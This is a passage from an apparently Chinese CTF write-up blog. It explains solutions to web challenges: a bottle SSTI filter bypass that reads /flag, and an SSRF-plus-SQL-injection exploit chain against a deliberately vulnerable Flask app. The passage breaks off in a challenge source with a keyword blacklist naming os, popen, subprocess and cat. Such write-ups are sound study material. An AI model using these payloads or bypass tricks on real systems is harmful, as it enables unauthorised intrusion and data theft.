class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br></code></pre></td></tr></table></figure><p><strong>bottleå¯ä»¥é€šè¿‡æ–œä½“å­—è¿›è¡Œwafçš„bypass</strong>   å‚è€ƒï¼š<a href="https://www.cnblogs.com/LAMENTXU/articles/18805019">https://www.cnblogs.com/LAMENTXU/articles/18805019</a></p><p>payload:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/attack?payload=</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">BApen</span>(%<span class="hljs-name">27/flag</span>%<span class="hljs-number">27</span>).re%aad()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="æ€è€ƒ-2"><a href="#æ€è€ƒ-2" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><p>æ²¡æœ‰æ€è€ƒï¼Œè‡ªå·±æ˜¯åºŸç‰©<img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250414215559182.png" alt="image-20250414215559182"></p><h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>laä½¬è¯´æ˜¯â€ç­¾åˆ°â€ğŸ¤¡ğŸ¤¡ğŸ¤¡</p><p>æºç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> json<br>app = flask.Flask(__name__)<br>blacklist = string.ascii_letters<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">binary_to_string</span>(<span class="hljs-params">binary_string</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(binary_string) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Binary string length must be a multiple of 8&quot;</span>)<br>    binary_chunks = [binary_string[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_string), <span class="hljs-number">8</span>)]<br>    string_output = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(chunk, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> binary_chunks)<br>    <br>    <span class="hljs-keyword">return</span> string_output<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/proxy&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nolettersproxy</span>():<br>    url = flask.request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;No URL provided&#x27;</span>)<br>    <br>    target_url = <span class="hljs-string">&quot;http://lamentxu.top&quot;</span> + url<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> url:<br>            <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-keyword">in</span> target_url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;No ssrf allowed&#x27;</span>)<br>    response = requests.get(target_url)<br><br>    <span class="hljs-keyword">return</span> flask.Response(response.content, response.status_code)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db_search</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> conn:<br>        cur = conn.cursor()<br>        cur.execute(<span class="hljs-string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="hljs-subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)<br>        found = cur.fetchone()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">if</span> found <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> found[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-built_in">print</span>(flask.request.remote_addr)<br>    <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/1337&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">api_search</span>():<br>    <span class="hljs-keyword">if</span> flask.request.remote_addr == <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:<br>        code = flask.request.args.get(<span class="hljs-string">&#x27;0&#x27;</span>)<br>        <span class="hljs-keyword">if</span> code == <span class="hljs-string">&#x27;abcdefghi&#x27;</span>:<br>            req = flask.request.args.get(<span class="hljs-string">&#x27;1&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                req = binary_to_string(req)<br>                <span class="hljs-built_in">print</span>(req)<br>                req = json.loads(req) <span class="hljs-comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span><br>            <span class="hljs-keyword">except</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Invalid JSON&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> req:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Empty Person&#x27;s name&quot;</span>)<br><br>            name = req[<span class="hljs-string">&#x27;name&#x27;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) &gt; <span class="hljs-number">6</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Too long&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO &#x27;&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;)&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO )&quot;</span>)<br>            <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            Some waf hidden here ;)</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br><br>            fate = db_search(name)<br>            <span class="hljs-keyword">if</span> fate <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                flask.abort(<span class="hljs-number">404</span>, <span class="hljs-string">&quot;No such Person&quot;</span>)<br><br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;Fate&#x27;</span>: fate&#125;<br>        <span class="hljs-keyword">else</span>:<br>            flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Hello local, and hello hacker&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Only local access allowed&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br><br><br></code></pre></td></tr></table></figure><p>jsonååºåˆ—åŒ–&amp;pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><h3 id="pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h3><p>åœ¨pythonä¸­ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨f-stringç›´æ¥ä¼ å…¥éå­—ç¬¦ä¸²å‚æ•°æ—¶ï¼Œå°±ä¼šè¢«å¼ºè½¬ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>å¦‚ä¸‹ï¼š</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250414215930925.png" alt="image-20250414215930925"></p><p>å› æ­¤ï¼Œè¿™é¢˜å¯ä»¥è¿™æ ·è§£ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;&quot;<span class="hljs-selector-tag">code</span>&quot;:[<span class="hljs-string">&quot;1&#x27;) UNION SELECT FLAG FROM FLAG --&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><p>ä¼ å…¥çš„codeä¸ºåˆ—è¡¨ï¼Œå› è€Œå¯ä»¥é€šè¿‡wafï¼ˆlenä¸º2ï¼Œæ²¡æœ‰<code>&#39;</code>å…ƒç´ ï¼‰éšåç›´æ¥è¢«f-stringå¼ºè½¬ï¼Œæ‹¼å…¥sqlè¯­å¥ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name <span class="hljs-keyword">FROM</span> country <span class="hljs-keyword">WHERE</span> code<span class="hljs-operator">=</span><span class="hljs-built_in">UPPER</span>(<span class="hljs-string">&#x27;[&quot;1&#x27;</span>) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> FLAG <span class="hljs-keyword">FROM</span> FLAG <span class="hljs-comment">--&quot;,&quot;1&quot;]&#x27;)</span><br></code></pre></td></tr></table></figure><p>å‚è€ƒäº†TCP1PCTFçš„Hackedé¢˜ç›®ï¼š<a href="https://www.cnblogs.com/LAMENTXU/articles/18461268">https://www.cnblogs.com/LAMENTXU/articles/18461268</a></p><p>é€šè¿‡<code>init_db.py</code>æˆ‘ä»¬å¯ä»¥çŸ¥é“ã€‚flagåœ¨LamentXUå¯¹åº”çš„å€¼é‡Œã€‚ä½†æ˜¯LamentXUçš„é•¿åº¦&gt;6ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥æŸ¥è¯¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Fate = [<br>    (<span class="hljs-string">&#x27;JOHN&#x27;</span>, <span class="hljs-string">&#x27;1994-2030 Dead in a car accident&#x27;</span>),<br>    (<span class="hljs-string">&#x27;JANE&#x27;</span>, <span class="hljs-string">&#x27;1990-2025 Lost in a fire&#x27;</span>),<br>    (<span class="hljs-string">&#x27;SARAH&#x27;</span>, <span class="hljs-string">&#x27;1982-2017 Fired by a government official&#x27;</span>),<br>    (<span class="hljs-string">&#x27;DANIEL&#x27;</span>, <span class="hljs-string">&#x27;1978-2013 Murdered by a police officer&#x27;</span>),<br>    (<span class="hljs-string">&#x27;LUKE&#x27;</span>, <span class="hljs-string">&#x27;1974-2010 Assassinated by a military officer&#x27;</span>),<br>    (<span class="hljs-string">&#x27;KAREN&#x27;</span>, <span class="hljs-string">&#x27;1970-2006 Fallen from a cliff&#x27;</span>),<br>    (<span class="hljs-string">&#x27;BRIAN&#x27;</span>, <span class="hljs-string">&#x27;1966-2002 Drowned in a river&#x27;</span>),<br>    (<span class="hljs-string">&#x27;ANNA&#x27;</span>, <span class="hljs-string">&#x27;1962-1998 Killed by a bomb&#x27;</span>),<br>    (<span class="hljs-string">&#x27;JACOB&#x27;</span>, <span class="hljs-string">&#x27;1954-1990 Lost in a plane crash&#x27;</span>),<br>    (<span class="hljs-string">&#x27;LAMENTXU&#x27;</span>, <span class="hljs-string">r&#x27;2024 Send you a flag flag&#123;fake&#125;&#x27;</span>)<br>]<br><br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯åœ¨CakeCTFçš„é‚£é“é¢˜ä¸Šå¥—äº†ä¸ªSSRFçš„ç¯èŠ‚ã€‚</p><p>æˆ‘ä¸ºäº†è®©jsonè¿™éƒ¨åˆ†æ›´æ˜æ˜¾ç”šè‡³å»é™¤äº†<code>flask.request.get_json()</code>è€Œæ˜¯ä½¿ç”¨äº†<code>json.loads()</code>ï¼Œç”šè‡³æ ‡äº†æ³¨é‡Šã€‚é¢˜ç›®åˆ°è¿™é‡Œåº”è¯¥æ˜¯å˜å¾—æ¯”è¾ƒç®€å•äº†ã€‚</p><p>æˆ‘ä»¬ä¸€ä¸ªç¯èŠ‚ä¸€ä¸ªç¯èŠ‚æ¥ã€‚</p><p>é¦–å…ˆçœ‹SSRFéƒ¨åˆ†ã€‚</p><p>1.åœ¨å‰é¢åŠ å…¥lamentxu.topï¼Œè¿™ä¸ªå¯ä»¥ç”¨@æ¥ç»•è¿‡ã€‚<br>2.ç¦æ­¢äº†æ‰€æœ‰å­—æ¯å’Œ<code>.</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨2130706433æ¥è¡¨ç¤º127.0.0.1ã€‚(ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ¬åœ°æµ‹è¯•è¿‡ä¸äº†ï¼Œæˆ‘é ğŸ¤¡ğŸ¤¡)<br>3.å¿…é¡»è¦ä¼ å…¥å‚æ•°0ä¸ºabcdefã€‚ä½¿ç”¨äºŒæ¬¡URLç¼–ç ç»•è¿‡ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯SQLæ³¨å…¥éƒ¨åˆ†</p><p>ä½¿ç”¨ä¸Šæ–‡æåˆ°çš„åŠæ³•å³å¯ï¼Œä½†æ˜¯è¿™é‡Œé™åˆ¶äº†åˆ—è¡¨å’Œå…ƒç»„ï¼Œä½¿ç”¨å­—å…¸ã€‚</p><p>ä¼ å…¥æ•°æ®ä¸ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;&#x27;))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME=&#x27;LAMENTXU&#x27; --&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ‹¼æ¥åçš„sqlè¯­å¥ä¸º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> FATE <span class="hljs-keyword">FROM</span> FATETABLE <span class="hljs-keyword">WHERE</span> NAME<span class="hljs-operator">=</span><span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-string">&#x27;&#123;&quot;&#x27;</span>))))))) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> FATE <span class="hljs-keyword">FROM</span> FATETABLE <span class="hljs-keyword">WHERE</span> NAME<span class="hljs-operator">=</span><span class="hljs-string">&#x27;LAMENTXU&#x27;</span> <span class="hljs-comment">--&quot;:1&#125;&#x27;)))))))</span><br></code></pre></td></tr></table></figure><p>å³å¯æˆåŠŸæ³¨å…¥ã€‚</p><p>æ¥ä¸‹æ¥å°†ä¼ å…¥çš„æ•°æ®ç¼–ç ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_binary</span>(<span class="hljs-params">input_string</span>):<br>    binary_list = [<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(char), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> input_string]<br>    binary_string = <span class="hljs-string">&#x27;&#x27;</span>.join(binary_list)<br>    <span class="hljs-keyword">return</span> binary_string<br><span class="hljs-built_in">print</span>(string_to_binary(<span class="hljs-string">&quot;&quot;&quot;&#123;&quot;name&quot;:&#123;&quot;&#x27;))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME=&#x27;LAMENTXU&#x27; --&quot;:1&#125;&#125;&quot;&quot;&quot;</span>))<br></code></pre></td></tr></table></figure><p>ç„¶åæ‰“å°±å®Œäº†ã€‚</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">GET /proxy?url=<span class="hljs-variable">@2130706433</span>:<span class="hljs-number">8080</span>/<span class="hljs-number">1337</span>?<span class="hljs-number">1</span>=<span class="hljs-number">011110110010001001101110011000010110110101100101001000100011101001111011001000100010011100101001001010010010100100101001001010010010100100101001001000000101010101001110010010010100111101001110001000000101001101000101010011000100010101000011010101000010000001000110010000010101010001000101001000000100011001010010010011110100110100100000010001100100000101010100010001010101010001000001010000100100110001000101001000000101011101001000010001010101001001000101001000000100111001000001010011010100010100111101001001110100110001000001010011010100010101001110010101000101100001010101001001110010000000101101001011010010001000111010001100010111110101111101</span><span class="hljs-variable">%260</span>=<span class="hljs-variable">%256</span>1<span class="hljs-variable">%256</span>2<span class="hljs-variable">%256</span>3<span class="hljs-variable">%256</span>4<span class="hljs-variable">%256</span>5<span class="hljs-variable">%256</span>6<span class="hljs-variable">%256</span>7<span class="hljs-variable">%256</span>8<span class="hljs-variable">%2569</span><br></code></pre></td></tr></table></figure><h2 id="Now-you-see-me-1"><a href="#Now-you-see-me-1" class="headerlink" title="Now you see me 1"></a>Now you see me 1</h2><p>æºç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># YOU FOUND ME ;)</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   src.py</span><br><span class="hljs-string">@Time    :   2025/03/29 01:10:37</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> sys<br>enable_hook =  <span class="hljs-literal">False</span><br>counter = <span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">audit_checker</span>(<span class="hljs-params">event,args</span>):<br>    <span class="hljs-keyword">global</span> counter<br>    <span class="hljs-keyword">if</span> enable_hook:<br>        <span class="hljs-keyword">if</span> event <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;compile&quot;</span>]:<br>            counter += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> counter &gt; <span class="hljs-number">4</span>:<br>                <span class="hljs-keyword">raise</span> RuntimeError(event)<br><br>lock_within = [<br>    <span class="hljs-string">&quot;debug&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;args&quot;</span>, <span class="hljs-string">&quot;values&quot;</span>, <br>    <span class="hljs-string">&quot;headers&quot;</span>, <span class="hljs-string">&quot;json&quot;</span>, <span class="hljs-string">&quot;stream&quot;</span>, <span class="hljs-string">&quot;environ&quot;</span>,<br>    <span class="hljs-string">&quot;files&quot;</span>, <span class="hljs-string">&quot;method&quot;</span>, <span class="hljs-string">&quot;cookies&quot;</span>, <span class="hljs-string">&quot;application&quot;</span>, <br>    <span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;url&#x27;</span> ,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <br>    <span class="hljs-string">&quot;getattr&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;&#123;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&#125;&quot;</span>, <br>    <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;self&quot;</span>, <br>    <span class="hljs-string">&quot;lipsum&quot;</span>, <span class="hljs-string">&quot;cycler&quot;</span>, <span class="hljs-string">&quot;joiner&quot;</span>, <span class="hljs-string">&quot;namespace&quot;</span>, <br>    <span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;join&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>, <br>    <span class="hljs-string">&quot;batch&quot;</span>, <span class="hljs-string">&quot;first&quot;</span>, <span class="hljs-string">&quot;last&quot;</span> , <br>    <span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;dict&quot;</span>,<span class="hljs-string">&quot;list&quot;</span>,<span class="hljs-string">&quot;g.&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;subprocess&quot;</span>,<br>    <span class="hljs-string">&quot;g|a&quot;</span>, <span class="hljs-string">&quot;GLOBALS&quot;</span>, <span class="hljs-string">&quot;lower&quot;</span>, <span class="hljs-string">&quot;upper&quot;</span>,<br>    <span class="hljs-string">&quot;BUILTINS&quot;</span>, <span class="hljs-string">&quot;select&quot;</span>, <span class="hljs-string">&quot;WHOAMI&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;nl&quot;</span>, <span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;setattr&quot;</span>, <span class="hljs-string">&quot;translate&quot;</span>,<br>    <span class="hljs-string">&quot;sort&quot;</span>, <span class="hljs-string">&quot;base64&quot;</span>, <span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-string">&quot;\\u&quot;</span>, <span class="hljs-string">&quot;pop&quot;</span>, <span class="hljs-string">&quot;referer&quot;</span>,<br>    <span class="hljs-string">&quot;The closer you see, the lesser you find.&quot;</span>] <br>        <span class="hljs-comment"># I hate all these.</span><br>app = flask.Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;try /H3dden_route&#x27;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/H3dden_route&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r3al_ins1de_th0ught</span>():<br>    <span class="hljs-keyword">global</span> enable_hook, counter<br>    name = flask.request.args.get(<span class="hljs-string">&#x27;My_ins1de_w0r1d&#x27;</span>)<br>    <span class="hljs-keyword">if</span> name:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> name.startswith(<span class="hljs-string">&quot;Follow-your-heart-&quot;</span>):<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lock_within:<br>                    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> name:<br>                        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;NOPE.&#x27;</span><br>                enable_hook = <span class="hljs-literal">True</span><br>                a = flask.render_template_string(<span class="hljs-string">&#x27;&#123;#&#x27;</span>+<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span>&#x27;</span>+<span class="hljs-string">&#x27;#&#125;&#x27;</span>)<br>                enable_hook = <span class="hljs-literal">False</span><br>                counter = <span class="hljs-number">0</span><br>                <span class="hljs-keyword">return</span> a<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;My inside world is always hidden.&#x27;</span><br>        <span class="hljs-keyword">except</span> RuntimeError <span 